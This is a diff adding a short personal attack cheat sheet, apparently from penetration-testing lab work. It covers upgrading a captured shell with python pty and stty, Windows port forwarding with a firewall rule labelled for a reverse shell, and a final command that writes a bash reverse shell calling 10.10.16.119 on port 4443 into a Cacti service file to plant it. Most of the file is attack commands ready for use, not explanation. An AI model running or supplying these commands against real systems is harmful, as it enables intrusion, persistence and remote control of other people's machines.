@@ -1,0 +1,23 @@
+
+GTFOBINS
+# Establiish Shell
+- in kali
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+python -c 'import pty; pty.spawn("/bin/bash")'
+ctrl +z 
+stty raw -echo; fg
+enter
+enter
+export TERM=xterm
+
+# portforwarding
+netsh interface portproxy add v4tov4 listenport=1234 listenaddress=0.0.0.0 connectport=1234 connectaddress=172.22.110.208
+
+New-NetFirewallRule -DisplayName "WSL Reverse Shell" -Direction Inbound -LocalPort 1234 -Protocol TCP -Action Allow
+netsh interface portproxy show all
+
+
+stty rows 30 cols 129
+
+echo -e '#!/bin/bash\nbash -i >& /dev/tcp/10.10.16.119/4443 0>&1' > /var/www/html/cacti/service/cactid.service
+
